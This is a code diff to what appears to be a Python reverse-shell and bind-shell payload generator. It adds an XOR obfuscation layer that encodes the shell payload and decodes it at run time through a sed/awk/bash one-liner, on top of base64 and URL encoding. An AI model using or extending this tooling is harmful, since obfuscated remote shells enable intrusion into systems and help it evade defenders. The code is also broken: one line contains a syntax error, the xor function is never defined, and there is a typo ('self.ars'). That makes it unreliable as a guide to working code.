@@ -1,6 +1,15 @@
 from encoders import powershell_base64
+from binascii import hexlify
 import platform
 import urllib
+
+def xor_wrapper(name, code, args, shell="/bin/bash"):
+    if args.xor is True:
+        if "powershell" in not in name.lower():
+            code = """s="";for x in $(echo {0}|sed 's/../&\\\\n/g'); do s=$s$(echo -e $(awk "BEGIN {printf \\"%x\\n\\", xor(0x$x, {1})}"|sed 's/../\\\\x&/g'));done;echo $s|{2}""".format(hexlify(xor(code, args.xor)), hex(args.xor), shell)
+            return code
+        else:
+            return code
 
 def base64_wrapper(name, code, args):
     if args.base64 is True:
@@ -29,7 +38,10 @@ class ReverseShell(object):
         """
         self.code = str(self.code.replace("TARGET", self.host)).replace("PORT", str(self.port))
         
-        # Apply the base64 encoding.
+        # Apply xor encoding.
+        self.code = self.code if self.xor is 0 else xor_wrapper(self.name, self.code, self.args)
+
+        # Apply base64 encoding.
         self.code = base64_wrapper(self.name, self.code, self.args)
 
         # Apply URL-encoding
@@ -51,6 +63,9 @@ class BindShell(object):
         Apply encoding, in the correct order, of course.
         """
         self.code = self.code.replace("PORT", str(self.port))
+
+        # Apply xor encoding.
+        self.code = self.code if self.xor is 0 else xor_wrapper(self.name, self.code, self.ars)
 
         # Apply base64 encoding.
         self.code = base64_wrapper(self.name, self.code, self.args)
